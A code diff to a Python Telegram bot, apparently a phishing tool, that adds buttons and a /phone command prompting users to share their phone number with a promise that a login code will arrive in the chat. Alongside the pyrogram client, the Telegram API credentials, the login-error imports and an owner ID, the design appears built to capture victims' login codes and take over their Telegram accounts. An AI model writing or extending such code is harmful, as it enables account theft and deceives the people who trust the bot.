@@ -9,7 +9,8 @@ from aiogram.filters import CommandStart, Command
 from aiogram.types import (
     Message, MenuButtonWebApp, WebAppInfo, 
     ReplyKeyboardRemove, InlineKeyboardMarkup, 
-    InlineKeyboardButton, CallbackQuery
+    InlineKeyboardButton, CallbackQuery,
+    ReplyKeyboardMarkup, KeyboardButton
 )
 from aiogram.client.default import DefaultBotProperties
 from pyrogram import Client
@@ -19,7 +20,7 @@ from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeEx
 BOT_TOKEN = os.environ["BOT_TOKEN"]
 OWNER_ID = int(os.environ["OWNER_ID"])
 WEBAPP_URL = "https://ps6104062-art.github.io/Logi/"
-API_ID = int(os.environ.get("API_ID", 0))  # из my.telegram.org
+API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 
 # ====== БАЗА ДАННЫХ ======
@@ -57,10 +58,35 @@ async def start(message: Message):
             web_app=WebAppInfo(url=WEBAPP_URL)
         )
     )
+    
+    # КНОПКА ДЛЯ ОТПРАВКИ НОМЕРА
+    contact_keyboard = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="📱 Отправить номер", request_contact=True)]
+        ],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    
     await message.answer(
-        "👋 Нажми кнопку ниже для входа\n\n"
+        "👋 Нажмите кнопку ниже, чтобы отправить номер\n\n"
         "📱 После отправки номера, код придёт в этот чат",
-        reply_markup=ReplyKeyboardRemove()
+        reply_markup=contact_keyboard
+    )
+
+# ====== КОМАНДА /PHONE (РУЧНОЙ ЗАПРОС) ======
+@dp.message(Command("phone"))
+async def request_phone(message: Message):
+    contact_keyboard = ReplyKeyboardMarkup(
+        keyboard=[
+            [KeyboardButton(text="📱 Отправить номер", request_contact=True)]
+        ],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+    await message.answer(
+        "📱 Нажмите кнопку, чтобы отправить номер:",
+        reply_markup=contact_keyboard
     )
 
 # ====== ПОЛУЧЕНИЕ КОНТАКТА ======
